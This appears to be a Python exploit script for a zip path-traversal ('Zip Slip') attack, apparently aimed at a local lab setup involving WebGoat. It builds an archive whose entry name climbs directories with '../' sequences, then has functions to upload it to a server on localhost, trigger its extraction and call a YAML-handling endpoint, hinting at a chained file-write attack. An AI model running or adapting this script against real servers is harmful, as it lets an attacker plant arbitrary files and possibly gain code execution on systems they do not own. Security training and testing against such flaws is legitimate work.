import os
import zipfile
import requests

remote = 'http://localhost:8085'
filename = 'webgoat.jpg'


def gen_zip(filename):
    try:
        zipFile = zipfile.ZipFile(f'bad.zip', 'w')
        zipFile.write(f"1.png", f"../../../../.webgoat-2025.3/PathTraversal/webgoat/{filename}", zipfile.ZIP_DEFLATED)
        zipFile.close()
    except Exception as e:
        print(e)


def upload_zip(filename):
    files = {'file': (f'{filename}.zip', open('bad.zip', 'rb'), 'application/zip')}
    response = requests.post(f'{remote}/api/upload', files=files)
    print(response.text)


def do_unzip(filename):
    data = {
        "filename": f"{filename}.zip"
    }
    response = requests.post(f'{remote}/api/unzip', data=data)
    print(response.text)


def do_yaml(filename):
    data = {
        "filename": f"{filename}"
    }
    response = requests.post(f'{remote}/yaml/handle', data=data)
    print(response.text)


gen_zip(filename)
# upload_zip(filename)
# do_unzip(filename)
# do_yaml(filename)